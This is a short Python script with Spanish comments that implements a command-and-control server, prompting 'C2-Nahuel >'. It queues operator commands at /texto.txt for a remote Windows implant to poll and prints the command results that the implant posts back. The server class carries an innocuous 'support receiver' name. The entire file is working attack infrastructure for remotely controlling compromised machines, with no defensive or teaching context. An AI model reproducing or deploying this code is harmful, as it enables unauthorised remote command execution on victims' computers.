from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import sys

# Variable global para almacenar el comando actual
comando_pendiente = ""

class ReceptorSoporte(BaseHTTPRequestHandler):
    # Desactivar logs por cada petición para no ensuciar la terminal
    def log_message(self, format, *args):
        return

    def do_GET(self):
        global comando_pendiente
        if self.path == '/texto.txt':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            
            # Enviamos el comando y lo limpiamos de la memoria
            if comando_pendiente:
                self.wfile.write(comando_pendiente.encode('utf-8'))
                comando_pendiente = "" # Se limpia para que no se repita
            else:
                self.wfile.write(b"") # Si no hay nada, enviamos vacío

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        print("\n" + "="*40)
        print("[+] RESULTADO RECIBIDO DESDE WINDOWS:")
        print("-" * 40)
        print(post_data.decode('utf-8', errors='ignore'))
        print("="*40 + "\n")
        
        self.send_response(200)
        self.end_headers()

def iniciar_servidor():
    port = 5454
    server = HTTPServer(('0.0.0.0', port), ReceptorSoporte)
    print(f"[*] Servidor activo en puerto {port}")
    server.serve_forever()

# Hilo para que el servidor corra de fondo mientras pedimos comandos por teclado
t = threading.Thread(target=iniciar_servidor)
t.daemon = True
t.start()

print("[*] Escribe un comando para enviar a Windows (ej: whoami, dir, etc):")
while True:
    cmd = input("C2-Nahuel > ")
    if cmd.lower() == "exit":
        sys.exit()
    comando_pendiente = cmd
